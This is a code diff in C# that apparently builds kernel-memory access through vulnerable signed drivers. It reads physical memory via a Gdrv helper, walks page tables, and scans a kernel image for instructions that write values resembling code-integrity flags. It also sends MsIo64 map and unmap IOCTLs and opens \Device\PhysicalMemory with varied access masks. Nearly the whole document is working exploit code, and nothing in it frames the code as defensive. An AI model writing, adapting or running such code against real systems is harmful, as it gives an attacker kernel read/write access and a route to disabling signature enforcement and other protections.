@@ -1,0 +1,112 @@
+        report = "";
+        int found = 0;
+        for (uint off = 0; off + 0x1000 <= sizeOfImage; off += 0x1000)
+        {
+            byte[] b = GdrvRead(g, physBase + off, 0x1000);
+            for (int i = 0; i + 10 <= 0x1000; i++)
+            {
+                if (b[i] != 0xC7 || b[i + 1] != 0x05) continue;
+                uint imm = BitConverter.ToUInt32(b, i + 6);
+                if (imm != 0x0E && imm != 0x06 && imm != 0x02 && imm != 0x0D) continue;
+                int disp = BitConverter.ToInt32(b, i + 2);
+                ulong instrVa = vaBase + off + (ulong)i;
+                ulong targetVa = instrVa + 7 + (ulong)(long)disp;
+                ulong tpa;
+                if (!Walk(g, cr3, targetVa, out tpa)) continue;
+                uint cur = RdD(g, tpa);
+                string tag = (cur == imm) ? "  <== SELF-CONSISTENT" : "";
+                report += string.Format("  instrVa=0x{0:x} writes=0x{1:x2} -> targetVa=0x{2:x} targetPa=0x{3:x} current=0x{4:x8}{5}\r\n",
+                                        instrVa, imm, targetVa, tpa, cur, tag);
+                found++;
+                if (found >= 12) return found.ToString();
+            }
+        }
+        return found.ToString();
+    }
+    // MsIo64 0x80102040 with the shape implied by the unmap handler's
+    // ProbeForRead/ProbeForWrite(q1, q0, 4) pair in temp\drv\msio_1500.txt:
+    //   q0 = length of a user in/out block, q1 = pointer to that block
+    //   (phys/size in, view/handle out), q2..q4 driver-owned.
+    // layout 0 = {phys, size}, layout 1 = {size, phys} inside the user block.
+    public static string MsIoMapTry2(IntPtr h, int layout, ulong pa, uint size, ulong q0len,
+                                     out uint err, out string detail)
+    {
+        err = 0; detail = "";
+        IntPtr inb = Marshal.AllocHGlobal(0x40);
+        IntPtr ub = Marshal.AllocHGlobal(0x80);
+        try
+        {
+            for (int i = 0; i < 0x40; i++) Marshal.WriteByte(inb, i, 0);
+            for (int i = 0; i < 0x80; i++) Marshal.WriteByte(ub, i, 0xCC);
+            if (layout == 0) { Marshal.WriteInt64(ub, 0, (long)pa); Marshal.WriteInt64(ub, 8, size); }
+            else { Marshal.WriteInt64(ub, 0, size); Marshal.WriteInt64(ub, 8, (long)pa); }
+            Marshal.WriteInt64(inb, 0, (long)q0len);
+            Marshal.WriteInt64(inb, 8, ub.ToInt64());
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102040, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            byte[] ib = new byte[0x28]; Marshal.Copy(inb, ib, 0, 0x28);
+            byte[] ubb = new byte[0x80]; Marshal.Copy(ub, ubb, 0, 0x80);
+            detail = "ctl=" + Hex(ib) + " user=" + Hex(ubb);
+            return (ok ? "OK" : "FAIL err=" + err) + " layout" + layout + " q0=0x" + q0len.ToString("x");
+        }
+        finally { Marshal.FreeHGlobal(inb); Marshal.FreeHGlobal(ub); }
+    }
+
+    public static string MsIoUnmapTry(IntPtr h, ulong q0, ulong q1, ulong q2, ulong q3, ulong q4,
+                                      out uint err)
+    {
+        err = 0;
+        IntPtr inb = Marshal.AllocHGlobal(0x28);
+        try
+        {
+            for (int i = 0; i < 0x28; i++) Marshal.WriteByte(inb, i, 0);
+            Marshal.WriteInt64(inb, 0x00, (long)q0);
+            Marshal.WriteInt64(inb, 0x08, (long)q1);
+            Marshal.WriteInt64(inb, 0x10, (long)q2);
+            Marshal.WriteInt64(inb, 0x18, (long)q3);
+            Marshal.WriteInt64(inb, 0x20, (long)q4);
+            uint got;
+            bool ok = DeviceIoControl(h, 0x80102044, inb, 0x28, inb, 0x28, out got, IntPtr.Zero);
+            err = (uint)Marshal.GetLastWin32Error();
+            return ok ? ("OK info=" + got) : ("FAIL err=" + err);
+        }
+        finally { Marshal.FreeHGlobal(inb); }
+    }
+
+    // Open \Device\PhysicalMemory with an explicit access mask (the p36 run
+    // proved SeLockMemoryPrivilege is ABSENT from an elevated token here, so the
+    // mask matters and all of them must be attempted).
+    public static string PhysMemOpenMask(uint mask, out IntPtr section,
+                                         out string privStatus)
+    {
+        section = IntPtr.Zero;
+        privStatus = EnablePriv("SeLockMemoryPrivilege");
+        string nm = @"\Device\PhysicalMemory";
+        IntPtr nameBuf = Marshal.StringToHGlobalUni(nm);
+        IntPtr usBuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
+        try
+        {
+            UNICODE_STRING us = new UNICODE_STRING();
+            us.Length = (ushort)(nm.Length * 2);
+            us.MaxLen = (ushort)((nm.Length + 1) * 2);
+            us.Buffer = nameBuf;
+            Marshal.StructureToPtr(us, usBuf, false);
+            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+            oa.Length = (uint)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
+            oa.Name = usBuf;
+            oa.Attributes = OBJ_CASE_INSENSITIVE;
+            IntPtr s;
+            int st = NtOpenSection(out s, mask, ref oa);
+            if (st < 0) return string.Format("mask=0x{0:x} st=0x{1:x8}", mask, st);
+            section = s;
+            return string.Format("mask=0x{0:x} ok handle=0x{1:x}", mask, s.ToInt64());
+        }
+        finally
+        {
+            Marshal.FreeHGlobal(nameBuf);
+            Marshal.FreeHGlobal(usBuf);
+        }
+    }
+// _END_
+}
